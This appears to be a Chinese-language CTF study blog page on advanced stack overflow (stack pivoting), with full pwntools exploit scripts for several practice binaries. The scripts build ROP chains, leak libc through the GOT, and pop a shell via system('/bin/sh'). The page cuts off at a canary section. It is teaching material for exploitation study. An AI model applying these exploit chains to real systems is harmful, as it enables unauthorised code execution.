@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
+    
+    <title>
+        
+            栈溢出进阶 |
+        
+        Keep Theme
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Keep Theme
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        栈溢出进阶
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Keep Team</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-07-23 14:16:44</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Tue Aug 26 2025 17:08:34 GMT+0800">2025-08-26 17:08:34</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/pwn-study/">pwn_study</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="change-ebp（栈劫持Demo1）"><a href="#change-ebp（栈劫持Demo1）" class="headerlink" title="change_ebp（栈劫持Demo1）"></a>change_ebp（栈劫持Demo1）</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250723185941585.png"  alt="image-20250723185941585"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250723185952958.png"  alt="image-20250723185952958"></p>
+<p>最多填充12个字节，只能覆盖到ebp</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250723192042102.png"  alt="image-20250723192042102"></p>
+<p>写入的magic的范围到0x0804A380～0x0804A38C</p>
+<p>所以栈迁移</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./change_ebp&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x080485D3&quot;)</span><br><span class="line"></span><br><span class="line">backdoor = 0x0804850B</span><br><span class="line">magic_addr = 0x0804A380</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;leave your name\n&quot;)</span><br><span class="line">payload = &quot;junk&quot; + p32(backdoor) + p32(magic_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="ebp-的作用"><a href="#ebp-的作用" class="headerlink" title="ebp 的作用"></a><code>ebp</code> 的作用</h3><p>在函数调用时，<code>ebp</code> 用于：</p>
+<ul>
+<li>定位局部变量（如 <code>v1</code> 位于 <code>ebp-8</code>）。</li>
+<li>在函数返回时恢复调用者的栈帧（通过 <code>leave</code> 指令）。</li>
+</ul>
+<p><strong>典型函数尾声（<code>leave; ret</code>）</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave  ; 相当于 mov esp, ebp; pop ebp</span><br><span class="line">ret    ; pop eip，跳转到返回地址</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>leave</code> 会：<ol>
+<li>把 <code>ebp</code> 的值赋给 <code>esp</code>（栈指针指向 <code>ebp</code>）。</li>
+<li>然后 <code>pop ebp</code>（恢复调用者的 <code>ebp</code>）。</li>
+</ol>
+</li>
+<li><code>ret</code> 会 <code>pop eip</code>（跳转到返回地址）。</li>
+<li></li>
+</ul>
+<p><strong>(1) <code>leave</code> 指令的执行</strong></p>
+<ul>
+<li><code>mov esp, ebp</code>：<ul>
+<li>原本 <code>ebp</code> 指向栈帧基址，但已经被覆盖为 <code>magic_addr</code>（<code>0x0804A380</code>）。</li>
+<li>所以 <code>esp</code> 现在指向 <code>magic_addr</code>（全局变量 <code>magic</code> 的地址）。</li>
+</ul>
+</li>
+<li><code>pop ebp</code>：<ul>
+<li>从 <code>esp</code>（<code>magic_addr</code>）弹出一个值到 <code>ebp</code>。</li>
+<li>如果 <code>magic</code> 区域没有特殊构造，这里可能不重要。</li>
+</ul>
+</li>
+</ul>
+<p><strong>(2) <code>ret</code> 指令的执行</strong></p>
+<ul>
+<li><code>pop eip</code>：<ul>
+<li>从 <code>esp</code>（<code>magic_addr + 4</code>）弹出一个值到 <code>eip</code>（程序计数器）。</li>
+<li><strong>关键点</strong>：<ul>
+<li><code>magic_addr + 4</code> 是 <code>magic</code> 变量的第 5-8 字节。</li>
+<li>攻击者已经通过 <code>read(0, &amp;magic, 0xCu)</code> 向 <code>magic</code> 写入了 12 字节数据。</li>
+<li>如果 <code>magic + 4</code> 处存放的是 <code>backdoor</code> 地址，<code>ret</code> 就会跳转到 <code>backdoor</code>！</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="ret2libc3-栈劫持Demo2"><a href="#ret2libc3-栈劫持Demo2" class="headerlink" title="ret2libc3(栈劫持Demo2)"></a>ret2libc3(栈劫持Demo2)</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250723193047906-1753342218466-1.png"  alt="img"></p>
+<p>在这里介绍一种新的办法，使函数可以不返回main函数</p>
+<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x0804854C&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">gets_plt = elf.plt[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line"># ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;</span><br><span class="line">pop_ebp_ret = 0x080485db</span><br><span class="line"># ROPgadget --binary ./ret2libc3 | grep leave</span><br><span class="line">leave_ret = 0x08048448</span><br><span class="line">rop_addr = 0x804a800</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload1 = &quot;a&quot; * 0x108 + &quot;junk&quot;</span><br><span class="line">payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)</span><br><span class="line">payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)</span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">leak_addr = u32(p.recv(4))</span><br><span class="line">libc_base = leak_addr - libc.symbols[&quot;gets&quot;]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">log.success(&quot;libc_base:&quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">system = libc.symbols[&quot;system&quot;]</span><br><span class="line">binsh = libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">payload2 = b&quot;A&quot; * 0x108  # 填充缓冲区</span><br><span class="line">payload2 += p32(system)  # 调用 system</span><br><span class="line">payload2 += p32(0)  # 返回地址（不重要，因为直接拿 shell）</span><br><span class="line">payload2 += p32(binsh)   # system 的参数</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="第一个paylaod"><a href="#第一个paylaod" class="headerlink" title="第一个paylaod"></a>第一个paylaod</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)</span><br></pre></td></tr></table></figure>
+
+<p>输出gets的got表地址，方便寻找libc基址</p>
+<p>然后p32(pop_ebp_ret)取出两个地址，一个放进ebp,一个放入eip(ret指令)，放进eip的也就是p32(gets_plt)，正好接上下一条指令继续执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)</span><br></pre></td></tr></table></figure>
+
+<p>调用gets的plt表，又产生了一个输入机会</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)</span><br></pre></td></tr></table></figure>
+
+<p>把rop_addr - 4作为ebp，所以程序会跳转到这里</p>
+<p>而rop_addr 的数据可以有payload2填入，精心构造即可</p>
+<h4 id="第二个paylaod"><a href="#第二个paylaod" class="headerlink" title="第二个paylaod"></a>第二个paylaod</h4><p>填入了上面的返回地址，使程序进入system函数，再构造system函数的参数&#x2F;bin&#x2F;sh</p>
+<p>就构造好了后门函数</p>
+<p>x64的情况其实差不多，就是先传入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3_x64&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x00000000004006F1&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3_x64&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">gets_plt = elf.plt[&quot;gets&quot;]</span><br><span class="line">rop_addr = 0x601800</span><br><span class="line"># ROPgadget --binary ./ret2libc3_x64 --only &quot;pop|ret&quot;</span><br><span class="line"># 0x0000000000400783 : pop rdi ; ret</span><br><span class="line">rdi = 0x0000000000400783</span><br><span class="line">pop_rsp3 = 0x000000000040077d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">p.recvuntil(&quot;ret2libc3_x64\n&quot;)</span><br><span class="line">payload1 = &quot;a&quot; * 0x100 + &quot;junkjunk&quot;</span><br><span class="line">payload1 += p64(rdi) + p64(gets_got)</span><br><span class="line">payload1 += p64(puts_plt)</span><br><span class="line">payload1 += p64(rdi) + p64(rop_addr)</span><br><span class="line">payload1 += p64(gets_plt)</span><br><span class="line">payload1 += p64(pop_rsp3) + p64(rop_addr - 0x18)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line">libc_base = leak_addr - libc.symbols[&quot;gets&quot;]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">log.success(&quot;libc_base:&quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">system = libc.symbols[&quot;system&quot;]</span><br><span class="line">binsh = libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">payload2 = p64(rdi) + p64(binsh)</span><br><span class="line">payload2 += p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="rbp-leave-栈劫持Demo3"><a href="#rbp-leave-栈劫持Demo3" class="headerlink" title="rbp_leave(栈劫持Demo3)"></a>rbp_leave(栈劫持Demo3)</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250723201159365.png"  alt="image-20250723201159365"></p>
+<p>v1存在栈溢出漏洞，但可输入的字符数太少</p>
+<p>最多覆盖到返回地址处，无法直接rop</p>
+<p>所以考虑用name来构造，然后用v1转过去</p>
+<h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = process(&quot;./rbp_leave&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x000000000040073F&quot;)</span><br><span class="line">elf = ELF(&quot;./rbp_leave&quot;)</span><br><span class="line">name_addr = 0x6010A0</span><br><span class="line"># ROPgadget --binary ./rbp_leave --only &quot;pop|ret&quot;</span><br><span class="line"># 0x0000000000400783 : pop rdi ; ret</span><br><span class="line">rdi = 0x4007c3</span><br><span class="line">rsi2 = 0x4007c1</span><br><span class="line">pop_rsp3 = 0x4007bd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># ROPgadget --binary ./rbp_leave | grep leave</span><br><span class="line">leave_ret = 0x4006f0 # leave ; ret</span><br><span class="line">ret = 0x4006f1</span><br><span class="line">read_input = 0x4006C7</span><br><span class="line">rop_addr2 = name_addr + 0x800</span><br><span class="line"></span><br><span class="line">name = p64(ret) *20</span><br><span class="line">name += p64(rdi) + p64(elf.got[&quot;read&quot;])</span><br><span class="line">name += p64(elf.plt[&quot;puts&quot;])</span><br><span class="line">name += p64(rdi) + p64(rop_addr2)</span><br><span class="line">name += p64(rsi2) + p64(0x200) + p64(0)</span><br><span class="line">name += p64(read_input)</span><br><span class="line">name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)</span><br><span class="line">p.sendafter(b&quot;leave your name\n&quot;,name.ljust(0x400,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = b&quot;a&quot; * 0x100</span><br><span class="line">payload1 += p64(name_addr - 8)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line">p.sendafter(&quot;try to break it\n&quot;,payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">libc=LibcSearcher(&quot;read&quot;,leak_addr)</span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;read&quot;)</span><br><span class="line">libc.address = libc_base</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base+libc.dump(&quot;system&quot;)</span><br><span class="line">binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload2 = p64(rdi) + p64(binsh)</span><br><span class="line">payload2 += p64(system)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="第一个payload"><a href="#第一个payload" class="headerlink" title="第一个payload"></a>第一个payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name += p64(rdi) + p64(elf.got[&quot;read&quot;])</span><br><span class="line">name += p64(elf.plt[&quot;puts&quot;])</span><br></pre></td></tr></table></figure>
+
+<p>调用puts函数打印read的got表地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name += p64(rdi) + p64(rop_addr2)</span><br><span class="line">name += p64(rsi2) + p64(0x200) + p64(0)</span><br><span class="line">name += p64(read_input)</span><br></pre></td></tr></table></figure>
+
+<p>调用read函数，read的参数比较多，所以多用了几个寄存器，把从终端输入的数据放在p64(rop_addr2)的位置上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)</span><br></pre></td></tr></table></figure>
+
+<p>因为p64(pop_rsp3)有三个pop指令，所以有要空出足够的距离，防止把重要数据弹出了</p>
+<h4 id="第二个payload"><a href="#第二个payload" class="headerlink" title="第二个payload"></a>第二个payload</h4><p>填补v1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p64(name_addr - 8)</span><br><span class="line">payload1 += p64(leave_ret)</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>p64(name_addr - 8)</code>：覆盖 <code>RBP</code></strong></p>
+<ul>
+<li><strong>目标</strong>：将 <code>RBP</code> 修改为 <code>name_addr - 8</code>。</li>
+<li><strong>为什么是 <code>name_addr - 8</code>？</strong><ul>
+<li><code>leave</code> 指令会执行 <code>mov rsp, rbp</code>，因此 <code>rsp</code> 将指向 <code>name_addr - 8</code>。</li>
+<li>接下来的 <code>ret</code> 会从 <code>name_addr</code>（即 <code>name</code> 的起始地址）开始执行 ROP 链。</li>
+<li><strong><code>-8</code> 的调整</strong>：因为 <code>leave</code> 之后会 <code>pop rbp</code>，<code>rsp</code> 会 <code>+8</code>，最终指向 <code>name_addr</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="第三个payload"><a href="#第三个payload" class="headerlink" title="第三个payload"></a>第三个payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p64(rdi) + p64(binsh)</span><br><span class="line">payload2 += p64(system)</span><br></pre></td></tr></table></figure>
+
+<p>为第一个payload提供的read输入</p>
+<p>综上所述</p>
+<p>通过0和2构造完整的后门函数，然后通过1进入执行这个后门函数</p>
+<p>脚本</p>
+<p><strong>如何选择合适的 <code>rop_addr2</code>？</strong></p>
+<p><strong>方法 1：使用 <code>name</code> 的扩展区域</strong></p>
+<ul>
+<li>如果 <code>name</code> 的大小是 <code>0x400</code>，可以选择 <code>name_addr + 0x400</code> 之后的地址（如 <code>name_addr + 0x800</code>）。</li>
+<li><strong>优点</strong>：简单直接，无需额外泄露地址。</li>
+<li><strong>缺点</strong>：需确保 <code>name</code> 区域足够大（或程序允许越界写入）。</li>
+</ul>
+<p><strong>方法 2：使用 libc 中的可写段</strong></p>
+<ul>
+<li>libc 中有许多可写区域（如 <code>__malloc_hook</code>、<code>__free_hook</code> 附近）。</li>
+<li><strong>步骤</strong>：<ol>
+<li>泄露 libc 基址（如通过 <code>puts(read_got)</code>）。</li>
+<li>计算目标地址（如 <code>libc_base + 0x3c4b00</code>）。</li>
+</ol>
+</li>
+<li><strong>优点</strong>：稳定，适合大型 ROP 链。</li>
+<li><strong>缺点</strong>：需要先泄露 libc 地址。</li>
+</ul>
+<p><strong>方法 3：使用堆（Heap）</strong></p>
+<ul>
+<li>如果程序调用了 <code>malloc</code>，堆地址可能可预测。</li>
+<li><strong>步骤</strong>：<ol>
+<li>泄露堆地址（如通过 <code>puts(malloc_got)</code>）。</li>
+<li>选择堆块中的空闲区域。</li>
+</ol>
+</li>
+<li><strong>优点</strong>：空间大，不易冲突。</li>
+<li><strong>缺点</strong>：需要堆泄露。</li>
+</ul>
+<h1 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h1><p>Canary的设计思想简单高效，就是在栈溢出发生的高危区域的尾部插入一个值，当函数返回时检测Canary的值是否发生了改变，从而判断是否发生栈溢出&#x2F;缓冲区溢出。</p>
+<h2 id="保护原理"><a href="#保护原理" class="headerlink" title="保护原理"></a>保护原理</h2><p>当程序启用Canary编译后</p>
+<p>插入Canary值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax，qword ptr fs:[0x28]</span><br><span class="line">mov qword ptr[rbp-8]，rax</span><br></pre></td></tr></table></figure>
+
+<p>检查</p>
